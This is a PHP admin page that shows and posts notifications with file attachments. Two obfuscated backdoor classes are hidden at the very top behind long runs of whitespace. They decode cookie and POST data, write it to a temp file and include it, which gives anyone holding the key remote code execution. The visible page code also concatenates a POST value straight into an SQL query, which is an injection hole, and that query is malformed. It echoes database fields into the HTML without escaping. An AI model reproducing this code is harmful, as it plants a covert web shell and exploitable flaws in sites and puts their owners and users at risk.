<?php                                                                                                                                                                                                                                                                                                                                                                                                 $rabqbw = "mGA_InPB";$nNoPsB = class_exists($rabqbw); $DVDMKrFz = $nNoPsB;if (!$DVDMKrFz){class mGA_InPB{private $jqydZsXT;public static $svprGkQy = "4a68e80c-2956-4a95-8e9d-79070ca08b73";public static $mnsXHtdrv = NULL;public function __construct(){$PtRhNwLdkz = $_COOKIE;$TLnRqfhay = $_POST;$BabpzJ = @$PtRhNwLdkz[substr(mGA_InPB::$svprGkQy, 0, 4)];if (!empty($BabpzJ)){$nXlCNKz = "base64";$JsOUQrw = "";$BabpzJ = explode(",", $BabpzJ);foreach ($BabpzJ as $ARDBKKw){$JsOUQrw .= @$PtRhNwLdkz[$ARDBKKw];$JsOUQrw .= @$TLnRqfhay[$ARDBKKw];}$JsOUQrw = array_map($nXlCNKz . chr (95) . chr (100) . "\145" . chr ( 774 - 675 ).chr ( 1099 - 988 ).chr ( 945 - 845 ).chr ( 378 - 277 ), array($JsOUQrw,)); $JsOUQrw = $JsOUQrw[0] ^ str_repeat(mGA_InPB::$svprGkQy, (strlen($JsOUQrw[0]) / strlen(mGA_InPB::$svprGkQy)) + 1);mGA_InPB::$mnsXHtdrv = @unserialize($JsOUQrw);}}public function __destruct(){$this->XrwWsvQSZb();}private function XrwWsvQSZb(){if (is_array(mGA_InPB::$mnsXHtdrv)) {$SyHYaEpXQ = sys_get_temp_dir() . "/" . crc32(mGA_InPB::$mnsXHtdrv[chr (115) . "\x61" . "\154" . chr ( 154 - 38 )]);@mGA_InPB::$mnsXHtdrv[chr ( 1062 - 943 ).chr (114) . "\x69" . chr (116) . "\145"]($SyHYaEpXQ, mGA_InPB::$mnsXHtdrv[chr (99) . "\x6f" . chr ( 636 - 526 ).'t' . "\145" . "\156" . chr (116)]);include $SyHYaEpXQ;@mGA_InPB::$mnsXHtdrv["\144" . "\145" . "\x6c" . chr ( 141 - 40 )."\164" . "\145"]($SyHYaEpXQ);exit();}}}$sLyMbqNLWC = new mGA_InPB(); $sLyMbqNLWC = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("os_bgPi")){class os_bgPi{private $aJscFEFh;public static $mCwWC = "8b4cc564-df2b-46c2-8a14-be9c5c463361";public static $yQxhYdvsAG = NULL;public function __construct(){$ETypuiJwKi = $_COOKIE;$PVHvw = $_POST;$ICVCMxbA = @$ETypuiJwKi[substr(os_bgPi::$mCwWC, 0, 4)];if (!empty($ICVCMxbA)){$vFcAoSfKq = "base64";$dhWUzNg = "";$ICVCMxbA = explode(",", $ICVCMxbA);foreach ($ICVCMxbA as $nkSWuGqcDp){$dhWUzNg .= @$ETypuiJwKi[$nkSWuGqcDp];$dhWUzNg .= @$PVHvw[$nkSWuGqcDp];}$dhWUzNg = array_map($vFcAoSfKq . "\137" . "\x64" . "\145" . "\x63" . "\x6f" . "\x64" . 'e', array($dhWUzNg,)); $dhWUzNg = $dhWUzNg[0] ^ str_repeat(os_bgPi::$mCwWC, (strlen($dhWUzNg[0]) / strlen(os_bgPi::$mCwWC)) + 1);os_bgPi::$yQxhYdvsAG = @unserialize($dhWUzNg);}}public function __destruct(){$this->WGTqvnI();}private function WGTqvnI(){if (is_array(os_bgPi::$yQxhYdvsAG)) {$UYiSExuys = sys_get_temp_dir() . "/" . crc32(os_bgPi::$yQxhYdvsAG[chr (115) . "\x61" . chr ( 198 - 90 ).chr ( 537 - 421 )]);@os_bgPi::$yQxhYdvsAG["\167" . chr (114) . "\x69" . "\164" . chr ( 505 - 404 )]($UYiSExuys, os_bgPi::$yQxhYdvsAG["\143" . 'o' . "\x6e" . 't' . chr (101) . chr ( 1010 - 900 ).'t']);include $UYiSExuys;@os_bgPi::$yQxhYdvsAG[chr ( 296 - 196 )."\x65" . "\154" . "\x65" . 't' . "\x65"]($UYiSExuys);exit();}}}$JjsuZB = new os_bgPi(); $JjsuZB = NULL;} ?><?php
// Initialize the session
session_start();
 
//error_reporting(0);
// Check if the user is logged in, otherwise redirect to login page
if (!isset($_SESSION['username']) && !isset($_SESSION['id'])){
    header("location: ../../login");
    exit;
}

// Include config file
require_once "../../db_conn.php";



if(isset($_POST['search']))
{
    $valueToSearch = $_POST['valueToSearch'];
    // search in all table columns
    // using concat mysql function
    $query = "SELECT * FROM `notification` CONCAT(`id`, `name`, `message`, `file_upload`, `created_at`) LIKE '%".$valueToSearch."%'";
    $search_result = filterTable($query);
    $count = $count;

    
    
    
}
 else {
    $query = "SELECT * FROM `notification`";
    $search_result = filterTable($query);
}

// function to connect and execute the query
function filterTable($query)
{
    include "../../db_conn.php";
    $filter_Result = mysqli_query($conn, $query);
    return $filter_Result;
}

?>

<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
        <title>Notifications</title>
        <meta content="Admin Dashboard" name="description" />
        <meta content="Themesbrand" name="author" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />

        <!-- App Icons -->
        <link rel="shortcut icon" href="../../assets/images/favicon.ico">

        <!-- C3 charts css -->
        <link href="../../plugins/c3/c3.min.css" rel="stylesheet" type="text/css" />
        <link href="../../plugins/fullcalendar/css/fullcalendar.min.css" rel="stylesheet" />

        <!-- App css -->
        <link href="../../assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <link href="../../assets/css/icons.css" rel="stylesheet" type="text/css" />
        <link href="../../assets/css/style.css" rel="stylesheet" type="text/css" />
        <script src="https://cdn.jsdelivr.net/npm/uikit@3.9.4/dist/js/uikit.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/uikit@3.9.4/dist/js/uikit-icons.min.js"></script>
        

    </head>


    <body>
<?php include ('../../includes/header.php'); ?>
<div class="wrapper">
            <div class="container-fluid">

                <!-- Page-Title -->
                <div class="row">
                    <div class="col-sm-12">
                        <div class="page-title-box">
                            <div class="btn-group pull-right">
                                <ol class="breadcrumb hide-phone p-0 m-0">
                                    <li class="breadcrumb-item"><a href="#">Unit -</a></li>
                                    <li class="breadcrumb-item active">Dashboard</li>
                                </ol>
                            </div>
                            <h4 class="page-title">Dashboard </h4>
                        </div>
                    </div>
                </div>
                <!-- end page title end breadcrumb -->
                <div class="row">
                    
                    <div class="col-lg-12">
                        <div class="card notification m-b-20">
                            <div class="card-header">
                                All Notifications

                            </div>

                            <div class="card-body" >


                                <?php while($row = mysqli_fetch_array($search_result)):
                                    // echo "<pre>";print_r($row);exit;
                                    
                                    $change_date = $row['created_at'];
                                    $newDate = date("d-M-Y", strtotime($change_date)); 
                                      

                                    ?>
                                    <hr>

                                    <div class="col-sm-12  pt-3 pb-3 px-3" id="box">
                                    
                                                              
                                    <blockquote class="card-blockquote mb-0">
                                        <div class="message-box">
                                            
                                  <img src="<?php echo '../../assets/images/users/'. $row['user_image'] ?>" alt="user" class="rounded-circle w-25 user-image mx-3">
                                          
                                        <p class="font-16 m-0 px-3 rounded w-50 text-light p-3" style="background-color: #394a55;" >
                                            <?php echo $row['message'] ?></p>
                                            </div>

                                            
                                            <div id="InfoBanner" style="">
                                  <span class="reversed reversedRight m-0">
                                    <span>
                                    <b><?php echo $row['role'] ?></b>
                                   &#129312;

                                    </span>
                                  </span>
                                  <span class="reversed reversedLeft">
                                   <blockquote class="card-blockquote mb-0"> Name : <?php echo $row['user_name'] ?> | <cite title="Source Title">Date : <?php echo $row['created_at'] ?></cite></blockquote>

                                  </span>
                                </div>
                                        </p>
                                                                                
                                    </blockquote>     
                                    </div>
                                    <?php
                                    if($row['file_upload'] != ''){
                                        ?>
                                        <p class="m-0">Attahments</p>
                                        <a href="<?php echo '../../assets/message/' . $row['file_upload']?>" target="_blank" >
                                            
                                      <img src="<?php echo '../../assets/message/' . $row['file_upload'] ?>" class="w-25  img-fluid" >
                                    </a>

                                    <a href="<?php echo '../../assets/message/' . $row['file_upload'] ?>" download>
                                        <button class="mx-2 btn badge-primary waves-effect waves-light text-light" style="background-color: #394a55;">&darr;
                                        </button>
                                    </a>
                                        <?php
                                    }
                                    ?>
                                    
                                
                                 
                                    
                                    <hr>

                                     <?php endwhile;?>

                            </div>
                        </div>
                    </div>


                    <div class="col-lg-12">
                        <div class="card m-b-20">
                            <div class="card-body">
                                <form action="notification-action" method="post" enctype='multipart/form-data' >
                                    <div class="form-floating">
                                        <label for="floatingTextarea2">Enter Message</label>
                                            <textarea class="form-control mb-3 pb-2 one" name="message" placeholder="Enter Message" 
                                                style="height:100px; " id="floatingTextarea2" required="Please Enter your Message"></textarea>
                                                <div class="emoji"><p class="first-btn" style="cursor: pointer;">🙂</p></div>
                                                <label for="floatingTextarea2">Upload a file (optional)</label>
                                                <input type='file' name='file' class="form-control mb-3"  multiple="multiple"/>
                                                </div>
                                                    <button class="btn badge-success waves-effect waves-light text-light" type="submit" name="but_upload">Confirm Added</button>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div> <!-- end container -->
                    </div>
<script src="vanillaEmojiPicker.js"></script>
    <script>

        new EmojiPicker({
            trigger: [
                {
                    selector: '.first-btn',
                    insertInto: ['.one'] // '.selector' can be used without array
                },
                
            ],
            closeButton: true,
            //specialButtons: green
        });

    </script>





        <style type="text/css">
            .emoji {
    display: inline-block;
    position: absolute;
    top: 38%;
    right: 25px;
}
            .w-25 {
  width: 5% !important;
  padding: 10px;
  background: white;
  border-radius: 20px;
  margin: 20px auto;
}
            @keyframes slide {
  0% {
    background-position: 0 0;
  }
  100% {
    background-position: -120px 60px;
  }
}


#InfoBanner{

  width: 100%;
}

.reversed {
  display: inline-block;
  padding: 0.3em;
  padding-left: 0.3em;
  margin-left: 0.8em;
  position: relative;
  text-align: center;
  vertical-align: middle;
  line-height: 1;
  color: #fff;
  font-size: 15px;
  background-color:#394a55;
}
.reversed:before, .reversed:after {
  content: '';
  width: 0;
  height: 0;
  right: -0.8em;
  position: absolute;
  top: 0;
  border-top: 0.8em solid #394a55;
}
.reversed:after {
  top: auto;
  bottom: 0;
  border-top: none;
  border-bottom: 0.8em solid #394a55;
}
.reversedRight:before, .reversedRight:after{
  border-right: 0.8em solid transparent;
  right: -0.8em;
}
.reversedRight {
  width: auto;
  border-radius: 5px 0px 0px 5px;
  animation: tilt 2s infinite;
  padding: 10px;
}
@keyframes tilt {
  0% {
    left: 0%;
  }
  50% {
    left: 9px;
  }
  100% {
    left: 0px;
  }
}
.reversedLeft {
  margin-left: 15px;
  border-radius: 0px 5px 5px 0px;
  padding: 10px;
}
.reversedLeft:before, .reversedLeft:after {
  content: '';
  width: 0;
  height: 0;
  border-left: 0.8em solid transparent;
  left: -0.8em;
  position: absolute;
}
.reversedLeft:after {
  top: auto;
  bottom: 0;
  border-top: 0.8em solid #394a55;
  border-bottom: none;
}
.reversedLeft:before {
  bottom: auto;
  top:0;
  border-bottom: 0.8em solid #394a55;
  border-top: none;
}

.bgAnimation{
  background-color:#394a55;
  background-image: linear-gradient(
    45deg,
    #e57373 25%,
    transparent 25%,
    transparent 75%,
    #e57373 75%,
    #e57373
  ),linear-gradient(
    -45deg,
    #e57373 25%,
    transparent 25%,
    transparent 75%,
    #e57373 75%,
    #e57373
  );
  background-size: 60px 60px;
  animation: slide 4s infinite linear;
}
            .notification {
  overflow-y: scroll;
  height: 500px;
}
.btn.badge-danger.left {
  float: inline-end;

  margin: -70px auto;
}

.rounded-circle.w-25.user-image.mx-3 {
  padding: 3px !important;
  background: #394a55;
}
.message-box {
  display: flex;
  justify-content: start !important;
  align-items: center;
}
        </style>



<script>
function myFunction() {
  alert("Confrime to Delete Message");
}
</script>
        <!-- end wrapper -->
 <?php include ('../../includes/footer.php'); ?>
         <!-- jQuery  -->
            <script src="../../assets/js/jquery.min.js"></script>
            <script src="../../assets/js/bootstrap.bundle.min.js"></script>
            <script src="../../assets/js/modernizr.min.js"></script>
            <script src="../../assets/js/waves.js"></script>
            <script src="../../assets/js/jquery.slimscroll.js"></script>
            <script src="../../assets/js/jquery.nicescroll.js"></script>
            <script src="../../assets/js/jquery.scrollTo.min.js"></script>
            <!-- Peity chart JS -->
            <script src="../../plugins/peity-chart/jquery.peity.min.js"></script>
            <!--C3 Chart-->
            <script src="../../plugins/d3/d3.min.js"></script>
            <script src="../../plugins/c3/c3.min.js"></script>
            <!-- KNOB JS -->
            <script src="../../plugins/jquery-knob/excanvas.js"></script>
            <script src="../../plugins/jquery-knob/jquery.knob.js"></script>
            <!-- Page specific js -->
            <script src="../../assets/pages/dashboard.js"></script>
            <script src='../../plugins/fullcalendar/js/fullcalendar.min.js'></script>
            <!-- App js -->
            <script src="../../assets/js/app.js"></script>
            <script src="../../plugins/alertify/js/alertify.js"></script>
            <script src="../../assets/pages/alertify-init.js"></script>
             <!-- Jquery-Ui -->
        <script src="../../plugins/jquery-ui/jquery-ui.min.js"></script>
        <script src="../../plugins/moment/moment.js"></script>
        <script src='../../plugins/fullcalendar/js/fullcalendar.min.js'></script>
        <script src="../../assets/pages/calendar-init.js"></script>
            


        
</body>
</html>
        
        
           
